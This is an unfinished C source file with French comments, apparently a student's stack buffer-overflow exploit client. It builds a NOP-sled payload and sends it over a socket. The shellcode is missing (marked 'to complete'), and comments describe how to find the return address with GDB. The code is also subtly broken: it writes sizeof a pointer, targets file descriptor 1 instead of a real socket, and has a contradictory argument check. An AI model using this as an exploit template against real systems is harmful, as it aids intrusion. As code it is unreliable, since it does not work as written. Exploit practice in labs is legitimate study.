#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h> // inet_addr()
#include <sys/socket.h>
#include <unistd.h> 
#define MAX 80

// Voir fonction strcat pour concaténer des chars (string.h)

void func(int sockfd, char *pay)
{
	/*char buff[MAX];
	int n;
	bzero(buff, sizeof(buff));
	n = 0;
	while ((buff[n++] = getchar()) != '\n')
		;*/
	printf("Overflow en cours...");
	write(sockfd, pay, sizeof(pay));
	//bzero(buff, sizeof(buff));
	read(sockfd, pay, sizeof(pay));
	printf("From Server : %s", pay);

	/*if ((strncmp(buff, "exit", 4)) == 0) {
		printf("Client Exit...\n");
		break;
	}*/
}

/*unsigned long get_sp(void) {
__asm__("movq %rsp,%rax");
}
long l=get_sp();
printf("Ox%lu\n", l);
*/



int main (int argc, char *argv[]){

	//int sockfd = (int)argv[1];
	int sockfd = 1;

    if (argc != 2) {
        printf("Erreur: la fonction %s ne requiert aucun parametres\n", argv[0]);
        return 1;
    }
	
    // Ecriture en dur du shellcode : 
    // NOP *40(etc 1 octet chaque) + shellcode (taille à définir POUR TAILLE BOF) 
    // + "A" *4(1 octet chaque) + @retour_dans_nop (== @relatif A CHERCHER GDB BASE PILE - [size(shellcode) + 4* A + moitié Nop])
    char payload[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x42\x41\x41\x41\x41\x40"; // A COMPLETER

    // COMMENT @retour = @base pile + taille instruction ENTIERE !!!

    // Envoi de la payload
	func(sockfd, payload);

    printf("%s\n", payload);
	printf("OK\n");
    return 0;
}